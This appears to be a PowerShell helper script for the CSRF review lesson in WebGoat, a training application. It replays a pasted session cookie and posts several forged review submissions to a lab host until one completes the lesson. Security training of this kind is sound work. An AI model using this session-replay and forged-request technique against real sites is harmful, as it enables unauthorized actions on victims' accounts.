# CSRF Review - Test Different Parameters

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "CSRF Review - Parameter Tester" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "Paste JSESSIONID:" -ForegroundColor White
$rawInput = Read-Host

$sessionId = $rawInput -replace '"', '' -replace "'", '' -replace 'JSESSIONID=', '' -replace 'JSESSIONID:', '' -replace '\s', ''

if ([string]::IsNullOrWhiteSpace($sessionId)) {
    Write-Host "No session ID provided. Exiting." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Using session: $sessionId" -ForegroundColor Green
Write-Host ""

# Create web session
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie("JSESSIONID", $sessionId, "/", "192.168.254.112")
$session.Cookies.Add("http://192.168.254.112:8001", $cookie)

$endpoint = "http://192.168.254.112:8001/WebGoat/csrf/review"

Write-Host "Testing different parameter combinations..." -ForegroundColor Cyan
Write-Host ""

# Different parameter combinations to try
$testCases = @(
    @{
        name = "Basic (stars + reviewText)"
        params = @{
            stars = "5"
            reviewText = "CSRF Attack Test 1"
        }
    },
    @{
        name = "With validateReq token"
        params = @{
            stars = "5"
            reviewText = "CSRF Attack Test 2"
            validateReq = "2aa14227b9a13d0bede0388a7fba9aa9"
        }
    },
    @{
        name = "With submit button"
        params = @{
            stars = "5"
            reviewText = "CSRF Attack Test 3"
            submit = "Submit"
        }
    },
    @{
        name = "With validateReq + submit"
        params = @{
            stars = "5"
            reviewText = "CSRF Attack Test 4"
            validateReq = "2aa14227b9a13d0bede0388a7fba9aa9"
            submit = "Submit"
        }
    },
    @{
        name = "Alternative field names (rating + comment)"
        params = @{
            stars = "5"
            review = "CSRF Attack Test 5"
            validateReq = "2aa14227b9a13d0bede0388a7fba9aa9"
        }
    },
    @{
        name = "All possible fields"
        params = @{
            stars = "5"
            reviewText = "CSRF Attack Test 6"
            review = "CSRF Attack Test 6"
            validateReq = "2aa14227b9a13d0bede0388a7fba9aa9"
            submit = "Submit"
            action = "submit"
        }
    }
)

$success = $false

foreach ($test in $testCases) {
    Write-Host "[$($testCases.IndexOf($test) + 1)/$($testCases.Count)] Testing: $($test.name)" -ForegroundColor Yellow
    Write-Host "Parameters: $($test.params.Keys -join ', ')" -ForegroundColor Gray
    
    try {
        $response = Invoke-WebRequest -Uri $endpoint -Method Post -Body $test.params -WebSession $session -ContentType "application/x-www-form-urlencoded" -UseBasicParsing
        
        Write-Host "✓ Status: $($response.StatusCode)" -ForegroundColor Green
        
        try {
            $json = $response.Content | ConvertFrom-Json
            
            Write-Host "Response:" -ForegroundColor Cyan
            Write-Host ($json | ConvertTo-Json -Depth 5) -ForegroundColor White
            
            if ($json.lessonCompleted -eq $true) {
                Write-Host ""
                Write-Host "========================================" -ForegroundColor Green
                Write-Host "🎉 SUCCESS! Lesson Completed!" -ForegroundColor Yellow
                Write-Host "========================================" -ForegroundColor Green
                Write-Host ""
                Write-Host "Working parameters:" -ForegroundColor Cyan
                $test.params.GetEnumerator() | ForEach-Object {
                    Write-Host "  $($_.Key) = $($_.Value)" -ForegroundColor White
                }
                $success = $true
                break
            } else {
                if ($json.feedback) {
                    Write-Host "Feedback: $($json.feedback)" -ForegroundColor Yellow
                }
            }
        } catch {
            Write-Host "Response (not JSON): $($response.Content.Substring(0, [Math]::Min(200, $response.Content.Length)))" -ForegroundColor Gray
        }
        
    } catch {
        Write-Host "✗ Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

if (-not $success) {
    Write-Host "========================================" -ForegroundColor Yellow
    Write-Host "None of the parameter combinations worked via PowerShell." -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Try using the HTML file instead:" -ForegroundColor White
    Write-Host "1. Open csrf_review_fixed.html in your browser" -ForegroundColor Gray
    Write-Host "2. Click the button to submit with all parameters" -ForegroundColor Gray
    Write-Host "3. Check WebGoat to see if the review was posted" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Or check the WebGoat page for hints about required parameters." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
